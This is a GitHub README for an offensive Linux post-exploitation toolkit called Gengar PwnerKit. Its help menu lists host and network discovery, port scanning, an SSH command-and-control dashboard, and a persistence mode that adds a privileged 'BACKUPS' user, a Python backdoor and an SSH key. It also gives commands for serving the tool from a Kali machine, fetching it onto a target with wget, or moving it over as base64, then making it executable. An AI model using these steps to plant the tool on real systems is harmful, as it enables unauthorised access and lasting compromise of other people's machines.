#Gengar PwnerKit

<div>
    <img src="https://img.shields.io/badge/-Linux-grey?logo=Linux&logoColor=white" width="70px">
    <img src="https://img.shields.io/badge/-Bash-green?logo=GNU-Bash&logoColor=white" width="70px">
    <img src="https://img.shields.io/badge/-Python3-3776AB?logo=Python&logoColor=white" width="90px">
</div>

## Persistence [TA0003](https://attack.mitre.org/tactics/TA0003/) | Privilege Escalation [TA0004](https://attack.mitre.org/tactics/TA0004/) | Discovery [TA0007](https://attack.mitre.org/tactics/TA0007/)
 
                    ![image](https://github.com/h0ru/gpk/blob/main/gengar.gif)

---
 
## About Gengar PwnerKit
### [+] Educational purposes
### [+] Rewritten and more objective code
### [+] New Features
### [+] Better usability
---

## How to Install?
```
wget -q https://raw.githubusercontent.com/h0ru/gpk/main/bin/gpk -O gpk ; chmod +x gpk
```
---
## Help Menu
```
 [*] HELP MENU

     [+] -h --help  -   HELP MENU (Show these help)
     [+] -m         -   MACHINE INFORMATIONS (Show Hardware/System Infos)
     [+] -ds        -   DEEP SEARCH (Show Tools, Crontab Files, SUID Binaries, Writable Folders)
     [+] -n         -   NETWORK (Show Network Information and use Ping Sweep and Port Scan modes)
     [+] -c2        -   CHACAL C2 (Manage SSH Connections Through a Dashboard)
     [+] -p         -   PERSISTENCE (Create a Privileged User Called BACKUPS, Create a Backdoor in Python3 and an SSH KEY)
```
---

## Check out some images
### [IMAGES](https://github.com/h0ru/gpk/blob/main/IMAGES.md)
---

## Sending to The Target
### Local Network
```
(KALI)
python3 -m http.server 80

(TARGET)
wget ip/gpk -O gpk ; chmod +x gpk
```
### Via BASE64
```
(KALI)
cat gpk | base64 -w0

(TARGET)
nano gpk.b64 (paste the base64 gpk code)

base64 -d gpk.b64 > gpk ; chmod +x gpk
```
---
